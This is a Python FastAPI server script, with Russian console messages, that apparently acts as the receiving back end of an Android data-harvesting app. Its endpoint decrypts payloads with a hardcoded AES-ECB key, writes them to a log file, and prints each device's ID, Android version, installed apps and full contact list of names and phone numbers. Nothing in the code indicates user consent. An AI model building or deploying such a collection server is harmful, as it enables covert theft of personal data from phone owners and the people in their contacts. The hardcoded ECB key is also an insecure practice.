import json
import logging
import string

from fastapi import FastAPI, HTTPException
from pydantic import BaseModel
from Crypto.Cipher import AES
import uvicorn
import base64

app = FastAPI()

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
file_handler = logging.FileHandler('logging.log')
file_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)


class EncryptedData(BaseModel):
    encrypted_data: str


@app.post("/api/v1/receiver")
async def receiver(data: EncryptedData):
    print("------------------ НОВОЕ ПОДКЛЮЧЕНИЕ ------------------")

    try:
        json_data = json_from_data(data)
        if json_data is None:
            return
        system_info = json_data['systemInfo']
        contacts = json_data['contacts']

        print_system_info(system_info)
        print('')
        print_contacts(contacts)

    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Ошибка получения данных: {str(e)}")
    print("-------------------------------------------------------")


def decrypt_aes(encrypted_data: str) -> str:
    key = "3918532652098796".encode("utf-8")
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_bytes = cipher.decrypt(base64.b64decode(encrypted_data))
    return decrypted_bytes.decode("utf-8")


def json_from_data(data: EncryptedData) -> json:
    try:
        decrypted_data = decrypt_aes(data.encrypted_data) \
            .replace("\\", "") \
            .replace('"{', '{') \
            .replace('}"', '}') \
            .replace('"[{', "[{") \
            .replace('}]"', "}]")


        printable_chars = set(string.printable)
        test = ['а', 'б', 'в', 'г', 'д', 'е', 'ё', 'ж', 'з', 'и', 'й', 'к', 'л', 'м', 'н', 'о', 'п', 'р', 'с', 'т', 'у', 'ф', 'х', 'ц', 'ч', 'ш', 'щ', 'ъ', 'ы', 'ь', 'э', 'ю', 'я', 'А', 'Б', 'В', 'Г', 'Д', 'Е', 'Ё', 'Ж', 'З', 'И', 'Й', 'К', 'Л', 'М', 'Н', 'О', 'П', 'Р', 'С', 'Т', 'У', 'Ф', 'Х', 'Ц', 'Ч', 'Ш', 'Щ', 'Ъ', 'Ы', 'Ь', 'Э', 'Ю', 'Я', ' ', '❤']
        filtered_string = ''.join(char for char in decrypted_data if char in printable_chars or char in test)

        logger.info(filtered_string.encode('ascii', 'ignore').decode('utf-8'))

        json_data = json.loads(filtered_string)
    except Exception as e:
        return None

    return json_data


def print_system_info(system_info: json):
    print("Информация об устройстве:")
    print(f"    Девайс {system_info['DeviceBrand']} {system_info['DeviceProduct']}")
    print(f"    Версия андроид: {system_info['AndroidVersion']}")
    print(f"    ID девайса: {system_info['DeviceId']}")
    print(f"    Свободная память: {float(float(system_info['FreeSpace']) / 1024 / 1024 / 1024):.1f} Гб")
    print(f"    Установленные приложения: {system_info['InstalledApps']}")


def print_contacts(contacts: json):
    print("Контакты на устройстве:")
    for contact in contacts:
        print(f"    {contact['Name']} : {contact['PhoneNumbers'][0]}")


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
